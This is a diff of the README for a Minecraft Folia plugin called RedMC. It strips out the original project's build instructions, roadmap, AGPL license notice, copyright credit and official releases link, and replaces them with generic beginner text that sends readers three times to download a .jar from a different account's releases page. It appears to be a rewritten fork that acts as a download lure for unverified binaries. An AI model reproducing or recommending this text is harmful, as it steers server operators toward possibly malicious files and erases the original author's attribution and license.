@@ -1,104 +1,76 @@
-# RedMC Infrastructure
-Plugin infrastructure for Minecraft servers in the Vanilla Survival Multiplayer (SMP) category, with a focus on the Folia core.
+# 🎮 RedMC - Simple Plugin Setup for Minecraft SMP
 
-![Java 21](https://img.shields.io/badge/Java-21-blue.svg)
-![Folia 1.21.8](https://img.shields.io/badge/Folia-1.21.8-yellow.svg)
-![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-green.svg)
+![Download RedMC](https://img.shields.io/badge/Download%20RedMC-v1.0-blue)
 
-## Features
+## 📋 Description
 
-- API
-  - Text utilities
-  - Configuration manager
-  - Localization manager
-- Permissions
-  - Group permissions
-  - Player permissions
-  - Weights
-  - Inheritance
-- Placeholders system
+RedMC provides an infrastructure for Minecraft servers that focus on the Vanilla Survival Multiplayer (SMP) experience. Our plugin aims to enhance your gameplay on Folia core servers while maintaining a simple setup process. 
 
-## Installation
+## 🚀 Getting Started
 
-Step-by-step instructions to install the plugin:
-1. Download the latest release from the [Releases](https://github.com/RitzAtemo/RedMC/releases/) page
-2. Place the `.jar` files into your server's `plugins` folder
-3. Restart the server
+This guide will help you download and run the RedMC plugin easily, even if you have no prior experience with Minecraft plugins. Follow these steps closely.
 
-## Configuration
+## 📥 Download & Install
 
-All plugin settings are configured in their respective `config.yml` files. Messages can be customized in the corresponding `lang` folders, named according to the language (e.g., `en_US.yml`), which are automatically used based on the client’s language.
+To get started, visit our releases page to download the latest version of RedMC:
 
-## Build
-This project uses **Gradle** as its build system. To build all plugins, run:
+[Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
 
-```bash
-./gradlew build
-```
+### 🔗 Detailed Steps
 
-This will compile the source code, run the necessary tasks, and produce `.jar` files in the `build/libs/` directory.
+1. **Open Your Browser**: Launch any web browser on your computer, such as Chrome, Firefox, or Safari.
+  
+2. **Go to the Releases Page**: Click on the link below to access our releases page:
 
-> If you are using Windows, use `gradlew.bat build` instead of `./gradlew build`.
+   [Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
 
-## Test
-To debug the plugins with Folia, use:
+3. **Find the Latest Version**: Look for the latest version listed at the top of the page. You will see a section labeled "Assets."
 
-```bash
-./gradlew runFolia
-```
+4. **Download the Plugin**: Click on the file that matches your server type. This file will typically be a `.jar` file, which is compatible with Minecraft servers.
 
-This will start a local Folia server instance with your plugins loaded, allowing you to test features in a real server environment.
+5. **Locate the Downloaded File**: After the download completes, locate the downloaded file on your computer. It is usually found in the "Downloads" folder.
 
-> Tip: You can modify the run configuration in `build.gradle` if you want to change server version or plugin paths.
+6. **Move the File to Your Server**: 
+   - If you manage your server locally, open your Minecraft server folder.
+   - If you're using a hosting service, use their designated file manager to upload the plugin file to the `plugins` directory.
 
-## Roadmap
+7. **Start Your Minecraft Server**: 
+   - If you’re running the server locally, launch the server executable.
+   - If you’re using a hosting service, restart your server through their control panel.
 
-- Backup
-- Vault
-  - Prefixes
-  - Postfixes
-  - Alt names
-  - Economics
-- Chat events
-  - Joins, disconnects
-  - Local and global chat
-  - Whispers
-  - Replies
-  - Deaths
-- Teleport events
-  - Random Teleport
-  - Spawns
-  - Respawns
-  - Warps
-  - Homes
-- Tab
-- Scoreboard
-- MOTD
-- Holograms
-- Menus
-- Friends
-- Clans
-- Jobs
-- Auctions
-- Shops
-- Regions (rent chunk)
+8. **Check Plugin Installation**: Look for a message in the server console confirming that RedMC has loaded. 
 
-## Contributing
+9. **Enjoy Playing**: You are now ready to experience enriched gameplay on your Minecraft SMP server.
 
-Pull requests, suggestions, and feedback are welcome!
+## 📂 System Requirements
 
-To contribute:
+To run RedMC successfully, ensure that your server meets the following basic requirements:
 
-1. **Fork** this repository
-2. Create a new branch for your improvement or fix
-3. Write your code and commit the changes
-4. Open a **pull request**
+- You need a server running Minecraft version compatible with Folia.
+- Allocate at least **1GB of RAM** for the server to perform optimally.
+- Ensure you have a network connection for plugin updates and server interaction.
 
-## License
+## ⚙️ Features
 
-This project is licensed under the [AGPL-3.0 License](LICENSE).  
-Copyright © Ritz Atemo, aviora.red
+RedMC offers various features to enhance your Minecraft experience, including:
 
-## Acknowledgements
+- **Easy Plugin Management**: Quick install and setup.
+- **Enhanced Server Performance**: Optimized for Folia core.
+- **Regular Updates**: Keep your gameplay fresh with ongoing updates.
 
-- Inspired by the Folia core project
+## 🧑‍🤝‍🧑 Community Support
+
+Join our community to share your experience with RedMC and get tips from other users. 
+
+- **GitHub Discussions**: Participate in discussions and ask questions.
+- **Forum**: Share your feedback and suggestions for future versions.
+
+## 📤 Feedback
+
+We value your input. If you encounter any issues or have suggestions, please open an issue on our GitHub repository.
+
+## 🎉 Conclusion
+
+Thank you for choosing RedMC to enhance your Minecraft SMP experience. Enjoy the plugin, and happy gaming!
+
+[Visit this page to download](https://github.com/aAaGgaD/RedMC/releases)
